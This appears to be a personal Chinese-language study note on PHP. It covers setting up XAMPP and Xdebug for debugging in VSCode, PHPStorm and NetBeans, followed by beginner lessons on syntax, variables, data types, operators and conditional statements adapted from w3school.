> [PHP 教程 (w3school.com.cn)](https://www.w3school.com.cn/php/index.asp)
>
> **PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。**
>
> ##### [PHP 参考手册](https://www.w3school.com.cn/php/php_ref.asp)
>
> ##### [PHP 测验](https://www.w3school.com.cn/php/php_quiz.asp)
>
> ---

# 安装与调试(Windows)

> [如何在VSCode配置PHP开发环境（详细版）[通俗易懂\] - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1990743)
>
> ---

---

## 下载 XAMPP

XAMPP 是一个把 Apache网页服务器与 PHP, Perl 及 MariaDB 合在一起的安装包, 允许用户在自己的电脑上轻易的创建网页服务器

XAMPP 的名称来自以下组合

- X(支持跨平台)
- Apache
- MySQL 或 MariaDB 
- PHP
- Perl

> Perl 是一种 CGI 脚本语言
>
> CGI 目前由 NCSA 维护，NCSA 定义 CGI 如下：
>
> CGI(Common Gateway Interface),通用网关接口,它是一段程序,运行在服务器上如：HTTP服务器，提供同客户端 HTML 页面的接口。
>
> ---
>
> 为了更好的了解 CGI 是如何工作的，我们可以从在网页上点击一个链接或 URL 的流程：
>
> - 1、使用你的浏览器访问 URL 并连接到 HTTP web 服务器。
> - 2、Web 服务器接收到请求信息后会解析 URL，并查找访问的文件在服务器上是否存在，如果存在返回文件的内容，否则返回错误信息。
> - 3、浏览器从服务器上接收信息，并显示接收的文件或者错误信息。
>
> CGI 程序可以是 Python 脚本，PERL 脚本，SHELL 脚本，C 或者 C++ 程序等。
>
> ---
>
> CGI 架构图:
>
> ![cgiarch](http://cdn.ayusummer233.top/img/202210210941771.png)
>
> ---
>
> > [Python3 CGI 编程_w3cschool](https://www.w3cschool.cn/python3/python3-cgi-programming.html)
>
> ---

XAMPP是一个易于安装的Apache发行版，其中包含MariaDB、PHP和Perl。仅仅需要下载并启动安装程序。

> [Download XAMPP (apachefriends.org)](https://www.apachefriends.org/zh_cn/download.html)
>
> ---

![image-20221021094326815](http://cdn.ayusummer233.top/img/202210210946224.png)

写 PHP 的话可以选择开启 Apache

---

### 配置环境变量

将 XAMPP 安装目录下的 php 目录添加到 `环境变量-系统变量-Path` 中然后在命令行中输入 `php -v` 就可以看到版本号了

> ![image-20221021095308959](http://cdn.ayusummer233.top/img/202210210953864.png)

---

## 下载 xdebug 插件

> [XDEBUG 从入门到精通 - 掘金 (juejin.cn)](https://juejin.cn/post/7045941450248306719)
>
> ---

Xdebug是PHP的扩展，用于协助调试和开发。

- 它包含一个用于IDE的调试器
- 它升级了PHP的`var_dump()`函数
- 它为通知，警告，错误和异常添加了堆栈跟踪
- 它具有记录每个函数调用和磁盘变量赋值的功能
- 它包含一个分析器
- 它提供了与PHPUnit一起使用的代码覆盖功能。

 但不推荐在生产环境中使用xdebug，因为他太重了。

---

> [xedebug 下载地址]([Xdebug: Downloads](https://xdebug.org/download))
>
> [[Configure Xdebug | PhpStorm (jetbrains.com)](https://www.jetbrains.com/help/phpstorm/2022.2/configuring-xdebug.html#c54f0dec)](https://xdebug.org/download)
>
> ---

在命令行输入 `php -i` 并把输出粘贴到 [Xdebug: Support — Tailored Installation Instructions](https://xdebug.org/wizard) 便可以看到需要下载哪个版本的 xedebug
下载完后将该 dll 文件拷贝到 `xampp/php/ext` 目录下并重命名为 `php_xebug.dll` 

> ![image-20221021111954317](http://cdn.ayusummer233.top/img/202210211119490.png)





将其放到 `xampp/php/ext` 目录下并修改 `xampp/php/php.ini` , 在末尾添加 `xedebug` 相关配置, 其中 `zend_extension` 为 `xedebug` 文件路径

`Xedebug3` 配置如下:

```ini
[xdebug]
zend_extension="<path to xdebug extension>"
xdebug.mode=debug
xdebug.client_host=127.0.0.1
xdebug.client_port="<the port (9003 by default) to which Xdebug connects>"
```

> ```ini
> [xdebug]
> zend_extension=xdebug
> xdebug.mode=debug
> xdebug.client_host=127.0.0.1
> xdebug.client_port="9003"
> ```
>
> xdebug dll 命名为 `php_xdebug.dll` 后这里的 `zend_extension` 就可以写 xebug, 否则写 dll 的完整路径

---

### 在 VSCode 中调试 PHP

安装 `PHP Debug` 扩展

> ![image-20221021101332552](http://cdn.ayusummer233.top/img/202210211013664.png)

修改 VSCode 的 `settings.json`, 修改如下配置

```json
"php.debug.executablePath": "D:/Software/Programming/PHP/XAMPP/php/php.exe",
```

---

打开一个文件目录创建并编辑 `test.php` 文件

```php
<?php
$a = 'hello world';
echo $a;
?>
```

`F5` 执行

> ![image-20221021103344298](http://cdn.ayusummer233.top/img/202210211033410.png)

也可以使用

---

### 在 PHPStorm 中调试 PHP

和上文中一样打开一个文件目录创建一个 `test.php` 文件

编辑配置项

![image-20221021112755348](http://cdn.ayusummer233.top/img/202210211127460.png)

填入 `php.exe` 以及 `php.ini` 的路径即可

![image-20221021112834002](http://cdn.ayusummer233.top/img/202210211128117.png)

调试 php 文件

![image-20221021112925694](http://cdn.ayusummer233.top/img/202210211129809.png)


---

# 通过 Apache NetBeans 安装与调试

下载Apache NetBeans(IDE)再去PHP官网([PHP: Hypertext Preprocessor](https://www.php.net/))下载php文件(类似Java的jdk)

NetBeans菜单栏选Tools下的option  里设置php interpreter 路径为下载的php文件地址

![image-20220802183902140](http://cdn.ayusummer233.top/img/image-20220802183902140.png)

菜单栏File下的  Project  Properties  设置成build-in web server

<img src="Tips.assets/image-20220802183933465.png" alt="image-20220802183933465" style="zoom:80%;" />

![image-20220802184041242](http://cdn.ayusummer233.top/img/image-20220802184041242.png)

新建PHP Project编写运行即可

---

# PHP

## PHP简介

- PHP在服务器上执行

- PHP 是 "PHP Hypertext Preprocessor" 的首字母缩略词

- PHP 文件能够包含文本、HTML、CSS 以及 PHP 代码
- PHP 代码在服务器上执行，而结果以纯文本返回浏览器
- PHP 文件的后缀是 ".php"

### PHP能做什么

- PHP 能够生成动态页面内容
- PHP 能够创建、打开、读取、写入、删除以及关闭服务器上的文件
- PHP 能够接收表单数据
- PHP 能够发送并取回 cookies
- PHP 能够添加、删除、修改数据库中的数据
- PHP 能够限制用户访问网站中的某些页面
- PHP 能够对数据进行加密

通过 PHP，您可以不受限于只输出 HTML。您还能够输出图像、PDF 文件、甚至 Flash 影片。您也可以输出任何文本，比如 XHTML 和 XML。

### 为什么使用PHP

- PHP 运行于各种平台（Windows, Linux, Unix, Mac OS X 等等）
- PHP 兼容几乎所有服务器（Apache, IIS 等等）
- PHP 支持多种数据库
- PHP 是免费的。请从官方 PHP 资源下载：[www.php.net](http://www.php.net/)
- PHP 易于学习，并可高效地运行在服务器端

## PHP安装

- 使用支持 PHP 和 MySQL 的 web 主机
- 在您的 PC 上安装 web 服务器，然后安装 PHP 和 MySQL。

**使用支持 PHP 的 Web 主机**

如果您的服务器支持 PHP，那么您无需做任何事情。

只要创建 .php 文件，然后上传到 web 目录中即可。服务器会自动对它们进行解析。

您无需编译或安装任何额外的工具。

因为 PHP 是免费的，大多数 web 主机都支持 PHP。

**在PC上运行PHP**

不过如果您的服务器不支持 PHP，那么您必须：

- 安装 web 服务器
- 安装 PHP
- 安装数据库，比如 MySQL

官方的 PHP 网站 (PHP.net) 提供了 PHP 的安装说明：http://php.net/manual/zh/install.php

### 注释

**提示：**如需在 Windows 平台设置并立即运行 PHP，您还可以：

[下载 WebMatrix](http://www.microsoft.com/web/webmatrix/)

## PHP语法

**PHP 脚本在服务器上执行，然后向浏览器发送回纯 HTML 结果。**

### 基础PHP语法

PHP 脚本可放置于文档中的任何位置。

PHP 脚本以 `<?php` 开头，以 `?>` 结尾：

```php
<?php
// 此处是 PHP 代码
?>
```

PHP 文件的默认文件扩展名是 ".php"。

PHP 文件通常包含 HTML 标签以及一些 PHP 脚本代码。

例子：

其中包含了使用内建 PHP 函数 "echo" 在网页上输出文本 "Hello World!" 的一段 PHP 脚本：

```php+HTML
<!DOCTYPE html>
<html>
<body>

<h1>我的第一张 PHP 页面</h1>

<?php
echo "Hello World!";
?>

</body>
</html>
```

**注释：**PHP 语句以分号结尾（;）。PHP 代码块的关闭标签也会自动表明分号（因此在 PHP 代码块的最后一行不必使用分号）。

### PHP 中的注释

PHP 代码中的注释不会被作为程序来读取和执行。它唯一的作用是供代码编辑者阅读。

注释用于：

- 使其他人理解您正在做的工作 - 注释可以让其他程序员了解您在每个步骤进行的工作（如果您供职于团队）
- 提醒自己做过什么 - 大多数程序员都曾经历过一两年后对项目进行返工，然后不得不重新考虑他们做过的事情。注释可以记录您在写代码时的思路。

PHP支持3中注释：

```php+HTML
<!DOCTYPE html>
<html>
<body>

<?php
// 这是单行注释

# 这也是单行注释

/*
这是多行注释块
它横跨了
多行
*/
?>

</body>
</html>
```

### PHP 大小写的敏感问题

在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。

不过在 PHP 中，所有变量都对大小写敏感。

## PHP变量

变量是存储信息的容器：

```php+HTML
<?php
$x=5;
$y=6;
$z=$x+$y;
echo $z;
?>
```

类似代数，在代数中我们使用字母（比如 x）来保存值（比如 5）。

在 PHP 中，起到代数作用的被称为*变量*。

**注释：**请把变量视为存储数据的容器。

正如代数，PHP 变量可用于保存值（x=5）和表达式（z=x+y）。

变量的名称可以很短（比如 x 和 y），也可以取更具描述性的名称（比如 carname、total_volume）。

### PHP 变量规则：

- 变量以 $ 符号开头，其后是变量的名称
- 变量名称必须以字母或下划线开头
- 变量名称不能以数字开头
- 变量名称只能包含字母数字字符和下划线（A-z、0-9 以及 _）
- 变量名称对大小写敏感（$y 与 $Y 是两个不同的变量）

**注释：**PHP 变量名称对大小写敏感！

### 创建 PHP 变量

PHP 没有创建变量的命令。

变量会在首次为其赋值时被创建：

```php+HTML
<?php
$txt="Hello world!";
$x=5;
$y=10.5;
?>
```

以上语句执行后，变量 txt 会保存值 Hello world!，变量 x 会保存值 5，变量 y 会保存值 10.5。

**注释：**如果您为变量赋的值是文本，请用引号包围该值。

### PHP 是一门类型松散的语言

在上面的例子中，请注意我们不必告知 PHP 变量的数据类型。

PHP 根据它的值，自动把变量转换为正确的数据类型。

在诸如 C 和 C++ 以及 Java 之类的语言中，程序员必须在使用变





量之前声明它的名称和类型。

### PHP 变量作用域

在 PHP 中，可以在脚本的任意位置对变量进行声明。

变量的作用域指的是变量能够被引用/使用的那部分脚本。

PHP 有三种不同的变量作用域：

- local（局部）
- global（全局）
- static（静态）

### Local 和 Global 作用域

函数*之外*声明的变量拥有 Global 作用域，只能在函数以外进行访问。

函数*内部*声明的变量拥有 LOCAL 作用域，只能在函数内部进行访问。

```php+HTML
<?php
$x=5; // 全局作用域

function myTest() {
  $y=10; // 局部作用域
  echo "<p>测试函数内部的变量：</p>";
  echo "变量 x 是：$x";
  echo "<br>";
  echo "变量 y 是：$y";
} 

myTest();

echo "<p>测试函数之外的变量：</p>";
echo "变量 x 是：$x";
echo "<br>";
echo "变量 y 是：$y";
?>
```

在上例中，有两个变量 $x 和 $y，以及一个函数 myTest()。$x 是全局变量，因为它是在函数之外声明的，而 $y 是局部变量，因为它是在函数内声明的。

如果我们在 myTest() 函数内部输出两个变量的值，$y 会输出在本地声明的值，但是无法 $x 的值，因为它在函数之外创建。

然后，如果在 myTest() 函数之外输出两个变量的值，那么会输出 $x 的值，但是不会输出 $y 的值，因为它是局部变量，并且在 myTest() 内部创建。

**注释：**您可以在不同的函数中创建名称相同的局部变量，因为局部变量只能被在其中创建它的函数识别。

### PHP global 关键词

global 关键词用于在函数内访问全局变量。

要做到这一点，请在（函数内部）变量前面使用 global 关键词：

```php
<?php
$x=5;
$y=10;

function myTest() {
  global $x,$y;
  $y=$x+$y;
}

myTest();
echo $y; // 输出 15
?
```

PHP 同时在名为 $GLOBALS[index] 的数组中存储了所有的全局变量。下标存有变量名。这个数组在函数内也可以访问，并能够用于直接更新全局变量。

上式可重写：

```php
<?php
$x=5;
$y=10;

function myTest() {
  $GLOBALS['y']=$GLOBALS['x']+$GLOBALS['y'];
} 

myTest();
echo $y; // 输出 15
?>
```

### PHP static 关键词

通常，当函数完成/执行后，会删除所有变量。不过，有时我需要不删除某个局部变量。实现这一点需要更进一步的工作。

要完成这一点，请在您首次声明变量时使用 *static* 关键词：

```php
<?php

function myTest() {
  static $x=0;
  echo $x;
  $x++;
}

myTest();
myTest();
myTest();

?>
```

然后，每当函数被调用时，这个变量所存储的信息都是函数最后一次被调用时所包含的信息。

**注释：**该变量仍然是函数的局部变量。

## PHP 5 echo 和 print 语句

**在 PHP 中，有两种基本的输出方法：echo 和 print。**

### PHP echo 和 print 语句

echo 和 print 之间的差异：

- echo - 能够输出一个以上的字符串
- print - 只能输出一个字符串，并始终返回 1

**提示：**echo 比 print 稍快，因为它不返回任何值。

### PHP echo 语句

echo 是一个语言结构，有无括号均可使用：echo 或 echo()。

#### 显示字符串

下面的例子展示如何用 echo 命令来显示不同的字符串（同时请注意字符串中能包含 HTML 标记）：

```php+HTML
<?php
echo "<h2>PHP is fun!</h2>";
echo "Hello world!<br>";
echo "I'm about to learn PHP!<br>";
echo "This", " string", " was", " made", " with multiple parameters.";
?>
```

运行结果：

![image-20220822180456072](http://cdn.ayusummer233.top/img/image-20220822180456072.png)

#### 显示变量

```php
<?php
$txt1="Learn PHP";
$txt2="W3School.com.cn";
$cars=array("Volvo","BMW","SAAB");

echo $txt1;
echo "<br>";
echo "Study PHP at $txt2";
echo "My car is a {$cars[0]}";
?>
```

![image-20220822180905330](http://cdn.ayusummer233.top/img/image-20220822180905330.png)

### PHP print 语句

print 也是语言结构，有无括号均可使用：print 或 print()。

#### 显示字符串

下面的例子展示如何用 print 命令来显示不同的字符串（同时请注意字符串中能包含 HTML 标记）：

```php
<?php
print "<h2>PHP is fun!</h2>";
print "Hello world!<br>";
print "I'm about to learn PHP!";
?>
```

![image-20220822181048454](http://cdn.ayusummer233.top/img/image-20220822181048454.png)

#### 显示变量

```php
<?php
$txt1="Learn PHP";
$txt2="W3School.com.cn";
$cars=array("Volvo","BMW","SAAB");

print $txt1;
print "<br>";
print "Study PHP at $txt2";
print "My car is a {$cars[0]}";
?>
```

![image-20220822181159146](http://cdn.ayusummer233.top/img/image-20220822181159146.png)

## PHP数据类型

**字符串、整数、浮点数、逻辑、数组、对象、NULL。**

### PHP 字符串

字符串是字符序列，比如 "Hello world!"。

字符串可以是引号内的任何文本。您可以使用单引号或双引号：

```php
<?php 
$x = "Hello world!";
echo $x;
echo "<br>"; 
$x = 'Hello world!';
echo $x;
?>
```

![image-20220822181404818](http://cdn.ayusummer233.top/img/image-20220822181404818.png)

### PHP 整数

整数是没有小数的数字。

整数规则：

- 整数必须有至少一个数字（0-9）
- 整数不能包含逗号或空格
- 整数不能有小数点
- 整数正负均可
- 可以用三种格式规定整数：十进制、十六进制（前缀是 0x）或八进制（前缀是 0）

在下面的例子中，我们将测试不同的数字。PHP var_dump() 会返回变量的数据类型和值：

```php
<?php 
$x = 5985;
var_dump($x);
echo "<br>"; 
$x = -345; // 负数
var_dump($x);
echo "<br>"; 
$x = 0x8C; // 十六进制数
var_dump($x);
echo "<br>";
$x = 047; // 八进制数
var_dump($x);
?>
```

![image-20220822181456105](http://cdn.ayusummer233.top/img/image-20220822181456105.png)

### PHP 浮点数

浮点数是有小数点或指数形式的数字。

在下面的例子中，我们将测试不同的数字。PHP var_dump() 会返回变量的数据类型和值：

```php
<?php 
$x = 10.365;
var_dump($x);
echo "<br>"; 
$x = 2.4e3;
var_dump($x);
echo "<br>"; 
$x = 8E-5;
var_dump($x);
?>
```

![image-20220822181853802](http://cdn.ayusummer233.top/img/image-20220822181853802.png)

### PHP逻辑

逻辑是 true 或 false。

```php
$x=true;
$y=false;
```

逻辑常用于条件测试。

### PHP 数组

数组在一个变量中存储多个值。

在下面的例子中，我们将测试不同的数组。PHP var_dump() 会返回变量的数据类型和值：

```php
<?php 
$cars=array("Volvo","BMW","SAAB");
var_dump($cars);
?>
```

![image-20220822182027215](http://cdn.ayusummer233.top/img/image-20220822182027215.png)

### PHP 对象

对象是存储数据和有关如何处理数据的信息的数据类型。

在 PHP 中，必须明确地声明对象。

首先我们必须声明对象的类。对此，我们使用 class 关键词。类是包含属性和方法的结构。

然后我们在对象类中定义数据类型，然后在该类的实例中使用此数据类型：

```php
<?php
class Car
{
  var $color;
  function Car($color="green") {
    $this->color = $color;
  }
  function what_color() {
    return $this->color;
  }
}
?>
```

![image-20220822182149453](http://cdn.ayusummer233.top/img/image-20220822182149453.png)

### PHP NULL 值

特殊的 NULL 值表示变量无值。NULL 是数据类型 NULL 唯一可能的值。

NULL 值标示变量是否为空。也用于区分空字符串与空值数据库。

可以通过把值设置为 NULL，将变量清空：

```php
<?php
$x="Hello world!";
$x=null;
var_dump($x);
?>
```

![image-20220822190507646](http://cdn.ayusummer233.top/img/image-20220822190507646.png)

## PHP字符串函数

**字符串是字符序列，比如 "Hello world!"。**

### strlen()函数

返回字符串的长度，以字符记。

strlen() 常用于循环和其他函数， 在确定字符串何时结束很重要时。（例如，在循环中，我们也许需要在字符串的最后一个字符之后停止循环）。

### str_word_count() 函数

对字符串中的单词进行计数

###  strrev() 函数

反转字符串

### strpos() 函数

strpos() 函数用于检索字符串内指定的字符或文本。

如果找到匹配，则会返回首个匹配的字符位置。如果未找到匹配，则将返回 FALSE。（从首字符的位置0开始）

```php
<?php
echo strpos("Hello world!","world");
?>
```



###  str_replace() 函数

一些字符串替换字符串中的另一些字符

用 "Kitty" 替换文本 "world"：

```php
<?php
echo str_replace("world", "Kitty", "Hello world!"); // 输出 Hello Kitty!
?>
```

## PHP常量

**常量类似变量，但是常量一旦被定义就无法更改或撤销定义。**

常量是单个值的标识符（名称）。在脚本中无法改变该值。

有效的常量名以字符或下划线开头（常量名称前面没有 $ 符号）。

**注释：**与变量不同，常量贯穿整个脚本是自动全局的。

### 设置 PHP 常量

如需设置常量，请使用 `define()` 函数 - 它使用三个参数：

1. 首个参数定义常量的名称
2. 第二个参数定义常量的值
3. 可选的第三个参数规定常量名是否对大小写不敏感。默认是 false。

下例创建了一个*对大小写敏感的常量*，值为 "Welcome to W3School.com.cn!"：

```php
<?php
define("GREETING", "Welcome to W3School.com.cn!");
echo GREETING;
?>
```

创建一个*对大小写不敏感的常量*，值为 "Welcome to W3School.com.cn!"：

```php
<?php
define("GREETING", "Welcome to W3School.com.cn!", true);
echo greeting;
?>
```

### 常量是全局的

常量是自动全局的，而且可以贯穿整个脚本使用。

下面的例子在函数内使用了一个常量，即使它在函数外定义：

```php
<?php
define("GREETING", "Welcome to W3School.com.cn!");

function myTest() {
    echo GREETING;
}
 
myTest();
?>
```

## PHP运算符

### PHP 算数运算符

| 运算符 | 名称 | 例子    | 结果            | 显示结果                                                     |
| :----- | :--- | :------ | :-------------- | :----------------------------------------------------------- |
| +      | 加法 | $x + $y | $x 与 $y 求和   | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_addition) |
| -      | 减法 | $x - $y | $x 与 $y 的差数 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_subtraction) |
| *      | 乘法 | $x * $y | $x 与 $y 的乘积 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_multiplication) |
| /      | 除法 | $x / $y | $x 与 $y 的商数 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_division) |
| %      | 取模 | $x % $y | $x 除 $y 的余数 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_modulus) |

```php
<?php 
$x=17; 
$y=8;
echo ($x + $y); // 输出 25
echo ($x - $y); // 输出 9
echo ($x * $y); // 输出 136
echo ($x / $y); // 输出 2.125
echo ($x % $y); // 输出 1
?>
```

### PHP 赋值运算符

PHP 赋值运算符用于向变量写值。

PHP 中基础的赋值运算符是 "="。这意味着右侧赋值表达式会为左侧运算数设置值。

| 赋值   | 等同于    | 描述                           | 显示结果                                                     |
| :----- | :-------- | :----------------------------- | :----------------------------------------------------------- |
| x = y  | x = y     | 右侧表达式为左侧运算数设置值。 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_set) |
| x += y | x = x + y | 加                             | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_addition2) |
| x -= y | x = x - y | 减                             | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_subtraction2) |
| x *= y | x = x * y | 乘                             | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_multiplication2) |
| x /= y | x = x / y | 除                             | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_division2) |
| x %= y | x = x % y | 模数                           | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_modulus2) |

下例展示了使用不同赋值运算符的不同结果：

```php
<?php 
$x=17; 
echo $x; // 输出 17

$y=17; 
$y += 8;
echo $y; // 输出 25

$z=17;
$z -= 8;
echo $z; // 输出 9

$i=17;
$i *= 8;
echo $i; // 输出 136

$j=17;
$j /= 8;
echo $j; // 输出 2.125

$k=17;
$k %= 8;
echo $k; // 输出 1
?>
```

### PHP 字符串运算符

| 运算符 | 名称     | 例子                                      | 结果                           | 显示结果                                                     |
| :----- | :------- | :---------------------------------------- | :----------------------------- | :----------------------------------------------------------- |
| .      | 串接     | $txt1 = "Hello" $txt2 = $txt1 . " world!" | 现在 $txt2 包含 "Hello world!" | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_string1) |
| .=     | 串接赋值 | $txt1 = "Hello" $txt1 .= " world!"        | 现在 $txt1 包含 "Hello world!" | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_string2) |

下例展示了使用字符串运算符的结果：

```php
<?php
$a = "Hello";
$b = $a . " world!";
echo $b; // 输出 Hello world!

$x="Hello";
$x .= " world!";
echo $x; // 输出 Hello world!
?>
```

### PHP 递增/递减运算符

| 运算符 | 名称   | 描述                      | 显示结果                                                     |
| :----- | :----- | :------------------------ | :----------------------------------------------------------- |
| ++$x   | 前递增 | $x 加一递增，然后返回 $x  | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_pre_increment) |
| $x++   | 后递增 | 返回 $x，然后 $x 加一递增 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_post_increment) |
| --$x   | 前递减 | $x 减一递减，然后返回 $x  | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_pre_decrement) |
| $x--   | 后递减 | 返回 $x，然后 $x 减一递减 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_post_decrement) |

下例展示了使用不同递增/递减运算符的不同结果：

```php
<?php
$x=17; 
echo ++$x; // 输出 18

$y=17; 
echo $y++; // 输出 17

$z=17;
echo --$z; // 输出 16

$i=17;phpphp
echo $i--; // 输出 17
?>
```

### PHP 比较运算符

PHP 比较运算符用于比较两个值（数字或字符串）：

| 运算符 | 名称               | 例子      | 结果                                               | 显示结果                                                     |
| :----- | :----------------- | :-------- | :------------------------------------------------- | :----------------------------------------------------------- |
| ==     | 等于               | $x == $y  | 如果 $x 等于 $y，则返回 true。                     | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_equal) |
| ===    | 全等（完全相同）   | $x === $y | 如果 $x 等于 $y，且它们类型相同，则返回 true。     | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_identical) |
| !=     | 不等于             | $x != $y  | 如果 $x 不等于 $y，则返回 true。                   | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_not_equal) |
| <>     | 不等于             | $x <> $y  | 如果 $x 不等于 $y，则返回 true。                   | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_not_equal2) |
| !==    | 不全等（完全不同） | $x !== $y | 如果 $x 不等于 $y，或它们类型不相同，则返回 true。 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_not_identical) |
| >      | 大于               | $x > $y   | 如果 $x 大于 $y，则返回 true。                     | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_greater_than) |
| <      | 小于               | $x < $y   | 如果 $x 小于 $y，则返回 true。                     | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_less_than) |
| >=     | 大于或等于         | $x >= $y  | 如果 $x 大于或者等于 $y，则返回 true.              | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_greater_than2) |
| <=     | 小于或等于         | $x <= $y  | 如果 $x 小于或者等于 $y，则返回 true。             | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_less_than2) |

下例展示了使用某些比较运算符的不同结果：

```php
<?php
$x=17; 
$y="17";

var_dump($x == $y);
echo "<br>";
var_dump($x === $y);
echo "<br>";
var_dump($x != $y);
echo "<br>";
var_dump($x !== $y);
echo "<br>";

$a=17;
$b=8;

var_dump($a > $b);
echo "<br>";
var_dump($a < $b);
?>
```

### PHP 逻辑运算符

| 运算符 | 名称 | 例子       | 结果                                             | 显示结果                                                     |
| :----- | :--- | :--------- | :----------------------------------------------- | :----------------------------------------------------------- |
| and    | 与   | $x and $y  | 如果 $x 和 $y 都为 true，则返回 true。           | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_and) |
| or     | 或   | $x or $y   | 如果 $x 和 $y 至少有一个为 true，则返回 true。   | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_or) |
| xor    | 异或 | $x xor $y  | 如果 $x 和 $y 有且仅有一个为 true，则返回 true。 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_xor) |
| &&     | 与   | $x && $y   | 如果 $x 和 $y 都为 true，则返回 true。           | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_and2) |
| \|\|   | 或   | $x \|\| $y | 如果 $x 和 $y 至少有一个为 true，则返回 true。   | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_or2) |
| !      | 非   | !$x        | 如果 $x 不为 true，则返回 true。                 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_not) |

### PHP 数组运算符

PHP 数组运算符用于比较数组：

| 运算符 | 名称   | 例子      | 结果                                                         | 显示结果                                                     |
| :----- | :----- | :-------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| +      | 联合   | $x + $y   | $x 和 $y 的联合（但不覆盖重复的键）                          | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_union) |
| ==     | 相等   | $x == $y  | 如果 $x 和 $y 拥有相同的键/值对，则返回 true。               | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_equality) |
| ===    | 全等   | $x === $y | 如果 $x 和 $y 拥有相同的键/值对，且顺序相同类型相同，则返回 true。 | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_identity) |
| !=     | 不相等 | $x != $y  | 如果 $x 不等于 $y，则返回 true。                             | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_inequality) |
| <>     | 不相等 | $x <> $y  | 如果 $x 不等于 $y，则返回 true。                             | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_inequality2) |
| !==    | 不全等 | $x !== $y | 如果 $x 与 $y 完全不同，则返回 true。                        | [显示结果](https://www.w3school.com.cn/tiy/s.asp?f=demo_php_operator_non_identity) |

下例展示了使用不同数组运算符的不同结果：

```php
<?php
$x = array("a" => "apple", "b" => "banana"); 
$y = array("c" => "orange", "d" => "peach"); 
$z = $x + $y; // $x 与 $y 的联合
var_dump($z);
var_dump($x == $y);
var_dump($x === $y);
var_dump($x != $y);
var_dump($x <> $y);
var_dump($x !== $y);
?>
```

![image-20220823094043424](http://cdn.ayusummer233.top/img/image-20220823094043424.png)

- [PHP 常量](https://www.w3school.com.cn/php/php_constants.asp)
- [PHP If...Else](https://www.w3school.com.cn/php/php_if_else.asp)

## PHP if...else....elseif语句

**条件语句用于基于不同条件执行不同的动作**

### PHP 条件语句

在您编写代码时，经常会希望为不同的决定执行不同的动作。您可以在代码中使用条件语句来实现这一点。

在 PHP 中，我们可以使用以下条件语句：

- *if 语句* - 如果指定条件为真，则执行代码
- *if...else 语句* - 如果条件为 true，则执行代码；如果条件为 false，则执行另一端代码
- *if...elseif....else 语句* - 根据两个以上的条件执行不同的代码块
- *switch 语句* - 选择多个代码块之一来执行

### PHP - if 语句

if 语句用于*在指定条件为 true 时*执行代码。

### 语法

```
if (条件) {
  当条件为 true 时执行的代码;
}
```

下例将输出 "Have a good day!"，如果当前时间 (HOUR) 小于 20：

```php
<?php
$t=date("H");

if ($t<"20") {
  echo "Have a good day!";
}
?>
```

### PHP - if...else 语句

请使用 if....else 语句*在条件为 true 时执行代码*，*在条件为 false 时执行另一段代码*。

```
if (条件) {
  条件为 true 时执行的代码;
} else {
  条件为 false 时执行的代码;
}
```

### PHP - if...elseif....else 语句

请使用 if....elseif...else 语句来*根据两个以上的条件执行不同的代码*。

### 语法

```
if (条件) {
  条件为 true 时执行的代码;
} elseif (condition) {
  条件为 true 时执行的代码;
} else {
  条件为 false 时执行的代码;
}
```

## PHP Switch 语句

**switch 语句用于基于不同条件执行不同动作。**

### Switch 语句

如果您希望有选择地执行若干代码块之一，请使用 Switch 语句。

使用 Switch 语句可以避免冗长的 if..elseif..else 代码块。

```
switch (expression)
{
case label1:
  expression = label1 时执行的代码 ;
  break;  
case label2:
  expression = label2 时执行的代码 ;
  break;
default:
  表达式的值不等于 label1 及 label2 时执行的代码;
}
```

工作原理：

1. 对表达式（通常是变量）进行一次计算
2. 把表达式的值与结构中 case 的值进行比较
3. 如果存在匹配，则执行与 case 关联的代码
4. 代码执行后，*break 语句*阻止代码跳入下一个 case 中继续执行
